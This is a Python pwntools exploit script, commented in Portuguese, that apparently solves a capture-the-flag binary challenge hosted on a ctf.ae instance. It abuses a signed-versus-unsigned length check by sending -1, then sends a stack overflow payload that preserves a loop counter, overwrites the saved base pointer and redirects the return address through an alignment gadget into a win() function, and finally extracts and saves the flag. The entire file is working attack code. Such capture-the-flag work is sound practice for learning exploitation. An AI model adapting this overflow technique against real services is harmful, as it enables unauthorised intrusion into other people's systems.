#!/usr/bin/env python3
from pwn import *
import re

# Alvo remoto informado pela instância do desafio
HOST = "548dcea9964507d9.chal.ctf.ae"
PORT = 443

# Endereços fixos porque o binário está sem PIE
WIN = 0x401b85

# Gadget ret usado para alinhar a stack antes de chamar win().
# Esse endereço é o ret final da função login.
RET = 0x401d2d

context.arch = "amd64"
context.log_level = "info"

def montar_payload():
    # Offset 0 até 75:
    # preenche o buffer até chegar no contador local em rbp-0x4.
    payload = b"A" * 76

    # Offset 76 até 79:
    # preserva o contador do loop com o valor 76 decimal, 0x4c.
    # Isso evita que o próprio overflow quebre o índice de escrita.
    payload += b"\x4c\x00\x00\x00"

    # Offset 80 até 87:
    # sobrescreve o saved RBP.
    payload += b"B" * 8

    # Offset 88:
    # sobrescreve o endereço de retorno.
    # Primeiro usamos RET para alinhamento.
    # Depois caímos em win().
    payload += p64(RET)
    payload += p64(WIN)

    return payload

def main():
    payload = montar_payload()

    log.info(f"Conectando em {HOST}:{PORT} com SSL")
    log.info(f"Tamanho do payload: {len(payload)} bytes")
    log.info(f"win() = {hex(WIN)}")
    log.info(f"ret alinhamento = {hex(RET)}")

    # A instância usa pwntools:443/ssl.
    # O parâmetro sni ajuda em serviços TLS com hostname virtual.
    io = remote(HOST, PORT, ssl=True, sni=HOST)

    # Bug:
    # A validação faz comparação assinada e aceita -1 porque -1 <= 64.
    # Depois o loop usa comparação unsigned, tratando -1 como 0xffffffff.
    io.sendlineafter(b"Password length: ", b"-1")

    # Envia o payload binário para corromper o retorno da função login.
    io.sendlineafter(b"Password: ", payload)

    # Recebe toda a resposta do servidor.
    resposta = io.recvall(timeout=5)
    texto = resposta.decode(errors="replace")
    print(texto)

    # Extrai a flag automaticamente se aparecer no output.
    match = re.search(r"flag\{[^}\r\n]+\}", texto, re.IGNORECASE)

    if match:
        flag = match.group(0)
        print(f"[+] FLAG ENCONTRADA: {flag}")

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
    else:
        print("[!] Flag não encontrada automaticamente.")
        print("[!] Se aparecer outro formato, copie manualmente do output acima.")

if __name__ == "__main__":
    main()
